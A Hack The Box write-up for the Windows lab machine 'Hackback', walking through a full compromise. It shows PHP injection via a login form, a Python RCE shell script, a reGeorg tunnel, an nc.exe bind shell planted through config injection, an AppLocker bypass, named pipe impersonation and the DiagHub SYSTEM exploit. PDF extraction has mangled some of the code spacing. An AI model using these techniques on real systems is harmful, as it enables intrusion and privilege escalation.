@@ -1,0 +1,780 @@
+Hackback
+
+29th May 2019 / Document No D19.100.27
+
+Prepared By: MinatoTW
+Machine Author: decoder & yuntao
+Difficulty: Insane
+Classification: Official
+
+                                                                       Page 1 / 46
+SYNOPSIS
+
+Hackback is an insane difficulty Windows box with some good techniques at play. A GoPhish
+website is discovered which leads us to some phishing vhosts. While fuzzing for files a javascript
+file is discovered which is rot13 encoded. It contains sensitive information about an admin page
+which leads to RCE vulnerability. PHP disabled_functions are in effect, and so ASPX code is used
+to tunnel and bypass the firewall.
+
+Enumeration of the file system leads to a code injection vulnerability in a configuration file, from
+which named pipe impersonation can be performed. Enumeration reveals that the user has
+permissions on a service, which allows for arbitrary writes to the file system. This is exploited to
+copy a DLL to System32, and triggering it using the DiagHub service to gain a SYSTEM shell.
+
+Skills Required              Skills Learned
+
+     Enumeration                  ASPX tunneling
+     Reverse Engineering          Named pipe impersonation
+     Modifying exploit code       Exploiting arbitrary writes
+
+                                                               Page 2 / 46
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.128 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr ' \n' ',' | sed s/,$//)
+ nmap -sC -sV -p$ ports 10.10.10.128
+
+IIS is running on port 80, and an unknown service is running on port 6666. Nmap guesses this to
+be HTTPAPI, which allows HTTP 2.0 communication between applications. We'll save it for
+investigation in the later stages. Port 64831 seems to be running some HTTPS application.
+
+                                                                                                                 Page 3 / 46
+PORT 6666 ( HTTP2 )
+
+From the nmap scan we know that port 6666 is running HTTP 2.0 API. We can use curl to request
+HTTP 2.0. Let's try that.
+ curl http://128.0.0.1:6666/ --http2
+
+We see that the page responds with a "Missing command" error. Let's try using some commands
+such as whoami.
+
+It responds with NT AUTHORITY\NETWORK SERVICE among other information. Let's try using
+help to see if some help menu exists.
+ curl http://128.0.0.1:6666/help --http2
+We get a list of commands such a services, ipconfig etc..
+From the info command we come to know that the server is running Windows server 19.
+
+                                                                                                                 Page 4 / 46
+Trying the netstat commands gives us a lot of information among which there's information about
+a service running on local port 5985 which could be WinRM.
+
+Let's look at the services now.
+   curl http://10.10.10.128:6666/services --http2 | less
+
+Among the other common services we find a strange name.
+
+This service is running as LocalSystem and isn't a default Windows service name. Let's save it for
+later.
+
+PORT 64831 ( GOPHISH )
+
+Navigating to port 64831 we see some cryptic response.
+
+                                                                                                                 Page 5 / 46
+But nmap showed the page to be running HTTPS, we browse to https://10.10.10.128:64831/.
+
+After accepting the certificate we see a GoPhish login page. Searching for GoPhish default
+credentials we find them in the d ocumentation as admin / gophish.
+Trying to log in with these credentials gets us into the admin page.
+
+                                                                                                                 Page 6 / 46
+Going through the application we find some email templates.
+
+Click on the edit template on the right shows the source code of the template. Here's a snippet
+from the HackTheBox template.
+
+                     <p > SENDER: admin@hackthebox.htb - SUBJECT: &#39;First blood
+ award&#39;&nbsp;</p >
+
+                      <p > You have been awarded with the 1st blood. <a
+ href= "http://www.hackthebox.htb"> Catch it now</a >!&nbsp; &nbsp;</p >
+
+                      <p>The HTB Team.&nbsp;&nbsp;</p >
+                      </t d>
+             </t r>
+             <tr>
+                      <t d s tyle= " padding:0;padding-top:25px;font-family:'Segoe
+ UI',Tahoma,Verdana,Arial,sans-serif;font-size:14px;color:#2a2a2a">
+                      <p >&nbsp;</p >
+
+                                                                                                                 Page 7 / 46
+The templates targets a user with a mail from admin@hackthebox.htb and link leading to
+http://www.hackthebox.htb. Maybe this is the vhost on the box ? Let's confirm this by adding it to
+the hosts file.
+
+echo '10.10.10.128  hackback.htb www.hackthebox.htb' >> /etc/hosts
+
+Now browsing to www.hackthebox.htb we see an exact copy of the HTB login page.
+
+Enter some credentials and submitting sends a POST request to the same page. So they must be
+getting stored somewhere else. There are similar pages for paypal, facebook, twitter in their
+respective vhosts. Looking at the admin template we find another vhost,
+
+Add this to the hosts file for further enumeration.
+
+                                                                                Page 8 / 46
+IIS
+
+Browsing to port 80 we just see an image of donkey without any other helpful information. Apart
+from the phishing templates we found another Admin vhost. Let's look at it.
+
+We see another login page and looking at the page source we find the login isn't configured,
+there's also a comment.
+This points towards a JavaScript file in the js folder. Let's use gobuster to find the file.
+
+                                                                                                                 Page 9 / 46
+GOBUSTER
+
+Running gobuster on the js folder in the admin vhost with .js extension.
+ gobuster -w directory-list-2.3-medium.txt -t 200 -u
+ http://admin.hackback.htb/js/ -x js
+
+It straight away finds a file named private.js. Let's inspect the file. The contents of the file is,
+ <script>
+
+           ine
+ n=['\k57\k78\k49\k6n\k77\k72\k37\k44\k75\k73\k4s\k38\k47\k73\k4o\k76\k52\k7
+ 7\k42\k2o\k77\k71\k33\k44\k75\k4q\k4o\k72\k77\k72\k4p\k44\k67\k63\k4s\k69\k
+ 77\k72\k59\k31\k4o\k45\k45\k67\k47\k38\k4o\k43\k77\k71\k37\k44\k6p\k38\k4o\
+ k33',' \k41\k63\k4s\k4q\k77\k71\k76\k44\k71\k51\k67\k43\k77\k34\k2s\k43\k74\
+ k32\k6r\k44\k74\k4q\k4o\k68\k5n\k63\k4o\k44\k77\k71\k54\k43\k70\k54\k73\k79
+ \k77\k37\k6r\k43\k68\k73\k4s\k51\k58\k4q\k4s\k35\k57\k38\k4o\k70\k44\k73\k4
+ s\k74\k4r\k43\k44\k44\k76\k41\k6n\k43\k67\k79\k6o\k3q', '\k77\k35\k48\k44\k7
+ 2\k38\k4s\k37\k64\k44\k52\k6q\k4q\k4q\k4o\k4n\k77\k34\k6n\k44\k6p\k56\k52\k
+ 6r\k77\k72\k74\k37\k77\k37\k73\k30\k77\k6s\k31\k61\k77\k37\k73\k41\k51\k73\
+ k4o\k73\k66\k73\k4s\k45\k77\k34\k58\k44\k73\k52\k6n\k43\k6p\k4q\k4s\k77\k46
+
+                                                                                                                Page 10 / 46
+\k7n\k72\k43\k6q\k7n\k70\k76\k43\k41\k6n\k43\k75\k42\k7n\k44\k73\k73\k4o\k3
+9\k46\k38\k4s\k34\k77\k71\k5n\k6r\k57\k73\k4o\k68'] ;(shapgvba(p,q){ine
+r=shapgvba(s){juvyr(--s){p['chfu'](p['fuvsg']());}};r(++q);}(n,0k66));ine
+o=shapgvba(p,q){p=p-0k0;ine
+r=n[p];vs(o['ZfHYzi']===haqrsvarq){(s hapgvba( ){ine s;gel{ine
+t=Shapgvba(' erghea\k20(shapgvba()\k20'+ ' {}.pbafgehpgbe(\k22erghea\k20guvf\k
+22)(\k20)'+ ' );') ;s=t();}pngpu(u){s=jvaqbj;}ine
+v=' NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/=';s['ng
+bo']||(s['ngbo']=shapgvba(w){ine x=Fgevat(w)[' ercynpr'] (/=+$/,' ') ;sbe(ine
+y=0k0,z,a,b=0k0,c=' ';a=x[' puneNg'] (b++);~a&&(z=y%0k4?z*0k40+a:a,y++%0k4)?c+
+=Fgevat[' sebzPunePbqr'](0kss&z>>(-0k2*y&0k6)):0k0){a=v['vaqrkBs'] (a);}erghe
+a c;});}());ine d=shapgvba(e,q){ine
+g=[],h=0k0,i,j='',k=' ';e=ngbo(e);sbe(ine
+l=0k0,m=e['yratgu'];l<m;l++){k+=' %'+ ('00'+ e[' punePbqrNg'] (l)[' gbFgevat'] (0k
+10))['fyvpr'] (-0k2);}e=qrpbqrHEVPbzcbarag(k);sbe(ine
+N=0k0;N<0k100;N++){g[N]=N;}sbe(N=0k0;N<0k100;N++){h=(h+g[N]+q['punePbqrNg']
+(N%q['yratgu'] ))%0k100;i=g[N];g[N]=g[h];g[h]=i;}N=0k0;h=0k0;sbe(ine
+O=0k0;O<e[' yratgu'];O++){N=(N+0k1)%0k100;h=(h+g[N])%0k100;i=g[N];g[N]=g[h];
+g[h]=i;j+=Fgevat[' sebzPunePbqr'] (e['punePbqrNg'] (O)^g[(g[N]+g[h])%0k100]);}
+erghea j;};o['BbNPpq'] =d;o[' dFYjTx'] ={};o['ZfHYzi']=!![];}ine
+P=o[' dFYjTx'] [p];vs(P===haqrsvarq){vs(o[' cVwyDO']===haqrsvarq){o['cVwyDO']=
+!![];}r=o['BbNPpq'](r,q);o[' dFYjTx'] [p]=r;}ryfr{r=P;}erghea r;};ine
+k='\k53\k65\k63\k75\k72\k65\k20\k4p\k6s\k67\k69\k6r\k20\k42\k79\k70\k61\k73
+\k73'; ine m=o(' 0k0',' \k50\k5q\k53\k36');ine
+u=o('0k1',' \k72\k37\k54\k59');ine l=o(' 0k2','\k44\k41\k71\k67') ;ine
+g='\k3s\k61\k63\k74\k69\k6s\k6r\k3q\k28\k73\k68\k6s\k77\k2p\k6p\k69\k73\k74
+\k2p\k65\k78\k65\k63\k2p\k69\k6r\k69\k74\k29';ine
+f=' \k26\k73\k69\k74\k65\k3q\k28\k74\k77\k69\k74\k74\k65\k72\k2p\k70\k61\k79
+\k70\k61\k6p\k2p\k66\k61\k63\k65\k62\k6s\k6s\k6o\k2p\k68\k61\k63\k6o\k74\k6
+8\k65\k62\k6s\k78\k29'; ine
+v=' \k26\k70\k61\k73\k73\k77\k6s\k72\k64\k3q\k2n\k2n\k2n\k2n\k2n\k2n\k2n\k2n
+'; ine x='\k26\k73\k65\k73\k73\k69\k6s\k6r\k3q';ine
+j='\k4r\k6s\k74\k68\k69\k6r\k67\k20\k6q\k6s\k72\k65\k20\k74\k6s\k20\k73\k61
+\k79';
+</script>
+
+                                                                                                               Page 11 / 46
+It seems to encoded or in some esoteric language. Looking at the top we find a term "ine" which
+is the rot13 encoded string for var. So the script is probably rot13 encoded. Copy it to a file to
+decode it.
+ cat private.js | /usr/games/rot13 > decoded.js
+Even after decoding the script is uneasy to read.
+
+Let's use an online b eautifier to clean the code and look at it. After beautifying the code appears
+to be obfuscated.
+
+Instead of trying to deobfuscate the code if we look further down we see that it initializes some
+variables namely x, z, h, y, t, s, i, k,w.
+
+                                                                                                                Page 12 / 46
+We can easily find the values by running the script in a browser and printing the values. Copy the
+beautified script and then open up the browser devtools using Ctrl+Shift+I. Then click on the
+console tab. Now paste the entire script into the console. Once done add this line and execute it.
+ console.log(x, z, h, y, t, s, i, k, w);
+
+We see a message written onto the console.
+
+ Secure Login Bypass Remember the secret path is
+ 2bb6916122f1da34dcd916421e531578 Just i n c ase I loose access to the admin
+ panel ?action=(show,list,exec, init)
+ &site=(twitter,paypal,facebook,hackthebox) &password=******** &session=
+ Nothing more to say
+
+We find a secret path and parameters action, site, password and session. Let's check what the
+secret path contains.
+Browsing directly to the page redirects us back to the login page. So maybe we need to have
+access to the admin panel first. As the message doesn't talk about the page name we'll have to
+fuzz it.
+
+                                                                                                                Page 13 / 46
+Gobuster can be used again to fuzz the admin page. We'll use aspx, asp and php extensions as
+IIS can support PHP too.
+ gobuster -w directory-list-2.3-medium.txt -t 200 -u
+ http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -x php,aspx
+
+After a while gobuster discovers webadmin.php. Directly hitting the page redirects us again.
+Maybe this is due to no session. Let's inspect it using Burp. We see that it responds with a 302
+FOUND and redirects to /.
+
+                                                                                                                Page 14 / 46
+But we have access to some parameters from the message. Let's use them to see if the response
+changes.
+ http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?act
+ ion=list&site=hackthebox&password=password&session=
+Trying the link above we receive a different response "Wrong secret key". This could mean that
+we need the correct password to proceed further.
+
+From the message earlier we know that the password is 8 characters long.
+
+FUZZING THE PASSWORD
+
+Let's extract all 8 character strings from rockyou to reduce the fuzzing time.
+ grep ' ^.\{8\}$' rockyou.txt > pass.txt
+And now fuzz the password using ffuf:
+ ./ffuf -w pass.txt --fw 3 -u
+ 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?ac
+ tion=list&site=hackthebox&password=FUZZ&session='
+
+                                                                                                                Page 15 / 46
+The password is found to be 12345678.
+
+Lets try sending the same request with this password.
+ http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?act
+ ion=list&site=hackthebox&password=12345678&session=
+
+This time the page responds with two log files. Trying action=show gives an empty response but
+maybe it requires the log file to show which could be the session parameter.
+ http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?act
+ ion=list&site=hackthebox&password=12345678&session=afc77af5c38d51e244b3b46d
+ 954c72ede1f599acdeb3c6c9744c364ca688203c
+
+                                                                                                                Page 16 / 46
+Trying the URL above we see that the page responds with credentials we tried on the
+HackTheBox phishing page earlier.
+
+As the we have total control over the input we can include arbitrary PHP code and get it
+executed. Let's try that. First login to the HackTheBox phishing page with these credentials:
+ <?php echo " pwned"; ?> / password
+Looking at the log once again it's seen that the string "pwned" is echoed.
+
+Now that we have RCE let's use PHP system() function to execute system commands.
+Login with the credentials:
+ <?php system("whoami"); ?> / password
+
+                                                                                                                Page 17 / 46
+Requesting the logs again we see that the username field is empty, this could mean that
+disabled_functions is enforced.
+
+Now that we can execute commands we need to find another way to enumerate the box. PHP
+provides some functions to help with this like the scandir() function can be used to list directories,
+the file_get_contents() function can be used to read a file and file_put_contents() can be used to
+write a file. For example, logging in with these credentials:
+ <?php print_r(scandir("/")); ?> / password
+And requesting the page, we see the contents of the C: drive.
+
+                                                                                                                Page 18 / 46
+ENUMERATING WITH PHP
+
+Let's look at the webadmin script to see if it has some other functionalities. We can use the
+file_get_contents function along with base64encode. The credentials are:
+ <?php e cho(base64_encode(file_get_contents(" ./webadmin.php"))); ?> /
+ password
+After logging in and requesting the page, we receive the script in base64.
+
+Copy the content and decode it locally.
+ base64 -d page.b64 > webadmin.php
+Looking at the script, at the top we see that the session is sha256 hash of the IP address.
+
+Further down we see that the init function clear a session and the exec function is just a dummy.
+                                                                                                                Page 19 / 46
+With all this knowledge we can create a script to implement all the functionality. Here's an
+example:
+
+ #!/usr/bin/python3
+
+ import requests
+ from cmd import Cmd
+ import sys
+ import re
+ from base64 import b64encode, b64decode
+ import hashlib
+ import netifaces as ni
+
+ def sendCmd( cmd):
+           url = "http://www.hackthebox.htb"
+           execc = "<?php "+ cmd + " ;?>";
+           params = {'_token' : ' 23HZyAY4Y8Z9wq1ntgvP8Yd', ' username' : execc,
+
+ 'password' : 'password', ' submit' : ' ' }
+           requests.post( url, data=params )
+
+ def g etOutput():
+           url =
+
+ "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
+           params = { "action": "show" , " site": "hackthebox" , " password"
+
+ :"12345678", " session" : session }
+           res = requests.get(url, params = params, allow_redirects= False)
+           return ((res.content).decode(" utf-8"))
+
+                                                                                                               Page 20 / 46
+def doReset():
+         url =
+
+"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
+         params = { "action": "init" , "site": " hackthebox" , "password"
+
+:"12345678", " session": session }
+         res = requests.get(url, params = params, allow_redirects= F alse)
+
+def f ixPath( path):
+         if "C:" in path:
+         path = path.replace("C:", "")
+         if "\\" in path:
+         path = path.replace(" \\", "/")
+         return path
+
+class T erminal( Cmd):
+         intro = " Hackback RCE script!\nUse help or ? for commands"
+         prompt = " :\> "
+
+def d efault(self, args):
+      doReset()
+      sendCmd(args)
+      print(getOutput())
+
+def d o_dir( self, args):
+
+'List files in specified directory'
+
+args = fixPath(args)
+
+cmd = " print_r(scandir(\"{}\"))".format(args)
+
+doReset()
+
+sendCmd(cmd)
+
+dirs = getOutput()
+
+m = re.search("\([\w\W]*\)", dirs)
+
+print(" Directory Listing for {}\r\n". format(args))
+
+f or i in m.group(0).splitlines():
+
+t ry:
+
+print("                    "+ i.split(" =>") [1 ] )
+
+except:
+
+                                                                      Page 21 / 46
+                             pass
+                print()
+
+         def d o_upload(self,args):
+         'Upload file to remote. Usage: upload local path,remote path'
+         local, remote = args.split(" ,")[0 ] , args.split(",")[1]
+         os.system("base64 {} > {}.b64". format(local, local))
+         local = local + " .b64"
+         content = open(local, "r").read()
+         cmd = " file_put_contents(\"{}\",
+base64_decode(\"{}\"))". format(local,(b64encode(content.encode(' utf-8')).de
+code(" utf-8")))
+         doReset()
+         sendCmd(cmd)
+         getOutput()
+         cmd = " file_put_contents(\"{}\",
+base64_decode(file_get_contents(\"{}\"))); echo
+'uploaded'".format(fixPath(remote),local)
+         doReset()
+         os.system("rm {}".format(local))
+         sendCmd(cmd)
+         if ' uploaded' in getOutput():
+
+                   print("Uploaded Successfully!")
+         else:
+
+                   print("There was an error uploading :(")
+
+         def do_download( self, args):
+         'Download file from remote. Usage: download remote path,local path'
+
+                remote, local = args.split(",") [0] , args.split(" ,")[1 ]
+                cmd = "echo
+'<file>';echo(base64_encode(file_get_contents(\"{}\"))); echo
+'<file>'". format(fixPath(remote))
+                doReset()
+                sendCmd(cmd)
+                b64File = re.search("<file>.*<file>", getOutput())
+                content = b64File.group(0) .replace(" <file>", "")
+                f = open(local, " wb+")
+                f.write(b64decode(content.encode('utf-8')))
+                print(" Download complete")
+
+                                                                                                              Page 22 / 46
+           def d o_exit(self, args):
+                  sys.exit(0 )
+
+ def main( ):
+           ip = ni.ifaddresses('tun0') [ni.AF_INET][0 ] [' addr']
+           p = ip.encode(' utf-8')
+           h = hashlib.new(" sha256")
+           h.update(p)
+           global session
+           session = h.hexdigest()
+           t = Terminal()
+           t.cmdloop()
+
+ if __name__ == ' __main__':
+           main()
+
+The script first finds the IP address from the tun0 interface ( change it to your VPN interface ) then
+creates a session out of it using sha256. The sendCmd function handles the creation of
+credentials with the PHP code. The doReset function is used to reset the log file using the init
+action as seen earlier which helps to avoid execution of older code. The fixPath function converts
+backslashes to forward slashes to prevent PHP errors.
+
+The Terminal class handles the input of commands where the do_dir command is used to list files
+in a directory, do_download downloads a file as seen earlier, it uses the <file> markers for easier
+regex search of the file contents and the do_upload function uploads a file by base64 encoding
+and copying it to the specified location. The script also supports history and tab autocomplete.
+
+                                                                                                               Page 23 / 46
+Running the script using python3:
+
+Now we can enumerate the file system using the script. We see a Projects folder and a util folder
+in the root directory. We don't have access to the util folder and projects has just one document.
+While enumerating the web folders we see a file web.config.old in the admin folder.
+
+This can be downloaded using the download functionality. For help type:
+ help download
+ download /inetpub/wwwroot/new_phish/admin/web.config.old,web.config.old
+
+                                                                                                               Page 24 / 46
+The file should be downloaded to the current folder. Looking at the contents of the
+web.config.old we credentials for the user simple.
+
+           <authentication mode=" Windows">
+           <identity impersonate=" true"
+
+                     userName="simple"
+                     password=" ZonoProprioZomaro:-("/ >
+           </authentication>
+
+ASPX TUNNELING
+
+Apart from PHP files an IIS server can also execute ASPX and ASP code. We can use ASPX to
+deploy a SOCKS proxy through the web server and bypass the firewall. This can be achieved
+using reGeorg. We can use the upload functionality in the script to upload the script. Use the help
+menu for instructions. Before that download tunnel.aspx and the python script from the GitHub
+repo.
+ wget https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx
+ wget
+ https://raw.githubusercontent.com/sensepost/reGeorg/master/reGeorgSocksProx
+ y.py
+Now upload it using the script, the default upload path is the secret folder on the box.
+
+                                                                                                               Page 25 / 46
+Now browsing to the page, this message should be seen:
+
+Using the reGeorgSocksProxy.py the proxy can activated.
+Supply it with the local port number and the URL at which the ASPX page was uploaded to.
+ python reGeorgSocksProxy.py -p 1080 -u
+ http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
+
+Now we can use proxychains in order to send traffic through the socks proxy and scan the box.
+Edit /etc/proxychains.conf and add the following line.
+ socks4 127.0.0.1 1080
+Now let's use nmap again to check the ports we found open earlier from port 6666/
+ proxychains nmap -sT -Pn -n 10.10.10.128 -p135,445,5985
+The -sT flag is used to do a full TCP connect scan and -Pn to avoid pinging through the proxy. We
+
+                                                                                                               Page 26 / 46
+find WinRM to be open on port 5985.
+
+FOOTHOLD
+
+As we already have credentials and can connect to WinRM through the proxy , let's try logging in.
+We can use this script which uses the ruby winrm module. Make the following change to the
+script:
+ conn = WinRM::Connection.new(
+
+    endpoint: ' http://10.10.10.128:5985/wsman',
+    transport: :ssl,
+    user: ' simple',
+    password: ' ZonoProprioZomaro:-(',
+    :no_ssl_peer_verification => true
+ )
+Now using it in combination with proxychains should give us a session.
+ rlwrap proxychains ruby winrm_shell_with_upload.rb
+
+And we have a shell as the user simple. The user is a member of project-managers group and
+has SeImpersonatePrivilege enabled which isn't normal for low level users.
+
+                                                                                                                Page 27 / 46
+Page 28 / 46
+LATERAL MOVEMENT
+ENUMERATION
+
+Which enumerating the folders earlier we found a util folder in the root directory. Let's see if we
+have access to it now.
+
+We do have access to it and there's a hidden folder named scripts. Let's check it out.
+
+We have some scripts, log files and a clean.ini file. Let's look at their permissions.
+                                                                                                               Page 29 / 46
+ icacls scripts\*.*
+
+Looking at the permissions we see that we Modify permissions on backup.bat and clean.ini and
+read permissions on batch.log and dellog.bat. There's another script named dellog.ps1 which we
+have no access to. Let's look at the dellog.bat script.
+
+The script executes dellog.ps1 and appends the output to the batch.log script. Then it runs all the
+scripts in the spool folder which we don't have permissions to view.
+Looking at the clean.ini file it looks like some sort of configuration file.
+
+                                                                                                               Page 30 / 46
+Maybe one of the scripts running in a scheduled task makes use of this configuration file. As we
+have Modify access to it let's injecting commands into the file.
+
+COMMAND INJECTION
+
+Let's modify the clean.ini to check if we can inject commands. Use the following commands;
+ echo "[Main]" > C:\util\scripts\clean.ini
+ echo " LogFile=c:\util\scripts\log.txt & whoami /all > c:\programdata\w.txt"
+ >> C:\util\scripts\clean.ini
+ echo "Directory=c:\inetpub\logs\logfiles & whoami /all >
+ C:\ProgramData\d.txt" >> C:\util\scripts\clean.ini
+
+Looking at the timestamps on the batch.log file we'll notice that the script runs every 5 minutes.
+After a while when the task runs again we should see the output of whoami /all in the
+"C:\ProgramData\w.txt" file while the file "C:\ProgramData\d.txt" is empty. This proves that there's
+a command injection in the LogFile attribute and that the task is running as the user hacker.
+
+Now in order to get a shell we can use nc.exe but we can't get a reverse shell due to firewall
+                                                                                                                Page 31 / 46
+restrictions. This can be solved by using a bind shell which listens on the host which we can
+connect to using proxychains.
+First upload nc.exe onto the box using the upload function in the winrm script. We'll see that we
+can't execute the binary due to AppLocker policy.
+ cd ~
+ UPLOAD nc64.exe C:\users\simple\nc.exe
+
+This can be easily bypassed by copying the binary into a whitelisted folder in System32 like
+"C:\windows\system32\spool\drivers\color\".
+ copy nc.exe C:\windows\system32\spool\drivers\color\
+And now trying to run the exe should work.
+
+To create a bind shell the command could be of the form:
+ cmd /c C:\windows\system32\spool\drivers\color\ nc.exe -lvp 4444 -e cmd.exe
+Use the following commands to create the clean.ini file:
+
+                                                                                                               Page 32 / 46
+ echo " [Main]" > \scripts\clean.ini
+ echo " LogFile=c:\util\scripts\log.txt & cmd /c
+ C:\windows\system32\spool\drivers\color\nc.exe -lvp 4444 -e cmd.exe" >>
+ C:\util\scripts\clean.ini
+ echo "Directory=c:\inetpub\logs\logfiles" >> C:\util\scripts\clean.ini
+
+And the next time when the script runs we should be able to connect to the port using
+proxychains.
+
+ALTERNATE METHOD USING NAMED PIPES
+
+Earlier we noticed that the user simple has SeImpersonatePrivilege. This can be abused by using
+named pipe impersonation. According to the documentation named pipes are used for facilitating
+IPC i.e Inter Process Communication. It can support two way communication between a server
+and it's clients.
+Named pipe i mpersonation allows a server to perform operations in the context of the clients.
+The LogFile attribute in the clean.ini configuration must be used to specify a log to write into. The
+user who runs the task could be writing to it. We can switch the LogFile with a named pipe so that
+when the user uses it, he connects to our malicious named pipe server.
+
+                                                                                                                Page 33 / 46
+So let's create our binary. The source code can be found here:
+https://github.com/MinatoTW/NamedPipeImpersonation/blob/master/NamedPipesCreateFile.c.
+Here's a step by step explanation of what the code does:
+First enable SeImpersonatePrivilege, this is just a precautionary step. A user should possess the
+privilege to be able to enable it.
+
+Then, create a named pipe "haxx" and used the security attributes sa which is set to allow global
+access to the pipe. It then waits for connection from clients. Once connected it reads from the
+pipe. This is necessary to perform before impersonation.
+
+Next, it tries to Impersonate the client, if successful it creates a file at the desired location using
+the CreateFile function and then writes data to it using the WriteFIle function. We can use this to
+write a bat file to the spool folder and get it executed.
+
+                                                                                                                Page 34 / 46
+First download the file make the following changes at the top:
+ char Data[] = " C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp
+ 5555 -e cmd.exe";
+ LPWSTR fileName = L"C:\\util\\scripts\\spool\\pwn.bat";
+
+Now compile the program using mingw. Make sure mingw-64 is installed.
+ apt install mingw-64
+ x86_64-w64-mingw32-gcc -D UNICODE NamedPipesCreateFile.c -o exploit.exe
+
+Now upload the exe using the PHP RCE script from earlier.
+ # Using the script
+ upload exploit.exe,/windows/system32/spool/drivers/color/exploit.exe
+
+Now inject the named pipe path into the LogFile attribute.
+ echo " [Main]" > C:\util\scripts\clean.ini
+
+                                                            Page 35 / 46
+ echo "LogFile=\\.\pipe\haxx" >> C:\util\scripts\clean.ini
+ echo " Directory=c:\inetpub\logs\logfiles" >> C:\util\scripts\clean.ini
+Once this is done, execute the binary and wait for the task to run again:
+ C:\windows\system32\spool\drivers\color\exploit.exe
+
+When the task runs and the pipe is accessed the exploit should be written into the spool folder
+and the bat file will get executed. We can then connect to it using proxychains.
+
+                                                                                                               Page 36 / 46
+PRIVILEGE ESCALATION
+ENUMERATION
+
+During the initial enumeration we discovered a service named UserLogger running as SYSTEM.
+Let's look at the details of the service.
+ powershell "&{ get-service userlogger | fl * }"
+However, we get minimal information, like the service is stopped and start type is manual.
+
+Let's query it using the sc command instead.
+ sc qc userlogger
+
+                                                                                                                Page 37 / 46
+We see the service binary path is C:\Windows\System32\UserLogger.exe. Let's see if we have
+permission to start/stop the service.
+ sc sdshow userlogger
+
+We can see the permissions using the sdshow command which is displayed in SDDL (Security
+Descriptor Definition Language). Let's break it down following this. The first ACL ending with SY
+is for the SYSTEM account. The next ACL is ending with the SID of hacker user. The ACE attribute
+"A::" at the beginning stands for "Allowed" which means that we have permission to start / stop
+the service.
+Having confirmed this, let's download and analyze the binary. To download it, first copy the
+binary to a readable folder like C:\ProgramData and then download it using the RCE script.
+
+ copy C:\windows\system32\userlogger.exe C:\programdata\userlogger.exe
+
+Note: Make sure you're on a 64 process, if not use a 64 bit netcat to spawn a shell, as a 32 bit
+shell can cause problems later.
+
+Now download it using the python RCE script from earlier.
+ download /programdata/userlogger.exe,userlogger.exe
+
+                                                           Page 38 / 46
+ANALYSING THE BINARY
+
+Let's see what the binary is doing under the hood with dynamic analysis. Copy the binary to a
+Windows VM, and make sure you're an Administrator. Now create a service just as on the box.
+ sc create UserLoggerSvc binPath= C:\users\administrator\userlogger.exe
+
+Now download Process Monitor from the SysInternals suite. You can find it here. This will help us
+to see what all the binary is doing while the service starts and runs.
+
+                                                                                                               Page 39 / 46
+Extract the contents and start Process Monitor. Click on the Filter drop down at the top and select
+Filter. Set the filter to match the Image Path to the userlogger.exe.
+
+And then click on "Add" to save the filter and press Ctrl + X to clear. Once done go back to the
+CMD prompt and start the service.
+ sc start userloggersvc
+
+Now going back to Process Monitor and looking at the events we find some CreateFile and
+WriteFIle operations.
+
+The binary creates a file at C:\Windows\Temp\UserLoggerService.log and then continuously
+accesses it to read and write. Let's see what the file contents are:
+
+                                                                                                               Page 40 / 46
+It says the no logfile was specified and that it is using the default which must be the current file.
+Then it logs the service status while starting and running. Let's try specifying a logfile as a
+command line option to see if the events change. Clear the Process Monitor console again.
+ sc stop userloggersvc
+ sc start userloggersvc C:\users\administrator\log
+
+We see the CreateFile event once again and this time the file create a log file at
+C:\Users\Administrator\log.log. And it's contents are:
+
+This time it says that the Logfile was specified. So from this dynamic analysis we came to know
+two things:
+
+     The service can take a parameter as a logfile path
+     It appends .log to the filename and uses it as a logfile.
+Let's test this behaviour on the box. Go back to the hacker shell and start the service with a
+logfile specified.
+
+                                                                                                                Page 41 / 46
+ sc start userlogger C:\ProgramData\tmp
+
+And now looking at the ProgramData we see that the file tmp.log does exist.
+
+This confirms that the service exhibits the same behaviour on the box as we analysed earlier.
+Note: In case the log file isn't created it means that the shell is a 32 bit process, get a shell using
+64 bit netcat then.
+Now let's see if we can write to sensitive locations like System32.
+ sc stop userlogger
+
+                                                                                                               Page 42 / 46
+ sc start userlogger C:\Windows\System32\bad
+
+This confirms that we can write to System32, and icacls shows that we have permissions to
+overwrite the created file.
+Now that we have the ability to perform arbitrary writes, we should be able to exploit it using the
+DiagHub collector POC by James Forshaw. A detailed explanation can be found here -
+https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html
+
+GETTING A SHELL
+
+Download the simplified version of the POC from h ere. Open up the solution in Visual Studio.
+Before compiling it we need to change a couple of things. First, in the diaghub_exploit.cpp
+change the valid_dir to some writable location like C:\ProgramData.
+
+                                                                                                                Page 43 / 46
+Once that's done, navigate to FakeDll.cpp and change the cmdline string to some file we can
+control.
+
+Now build the solution and copy the binary as well as the DLL to local box. Then upload it using
+WinRM script or using the PHP RCE script.
+ UPLOAD diaghub_exploit.exe C:\ProgramData\diaghub.exe
+ UPLOAD Fakedll.dll C:\ProgramData\Fake.dll
+
+Now from a hacker shell create the bat script which will trigger our shell:
+ echo "cmd /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 5555 -e
+ cmd.exe" >> C:\users\hacker\r.bat
+
+                                                                                                                Page 44 / 46
+Then start the userlogger service creating a log file in System32 then copy the DLL over it.
+ sc start userlogger C:\WINDOWS\SYSTEM32\pwn
+ copy C:\ProgramData\Fake.dll C:\WINDOWS\SYSTEM32\pwn.log
+ copy C:\ProgramData\diaghub.exe C:\windows\system32\spool\drivers\color\
+
+And then execute the binary with pwn.log as the argument.
+
+And on the other side we have a SYSTEM shell!
+
+                                               Page 45 / 46
+Going into the Administrator's Desktop we see that the file isn't an MD5 hash.
+
+However, if we check of the NTFS ADS ( Alternate Data Streams ) we see that flag.txt exists.
+ dir /ah /r
+
+The flag can be viewed by using:
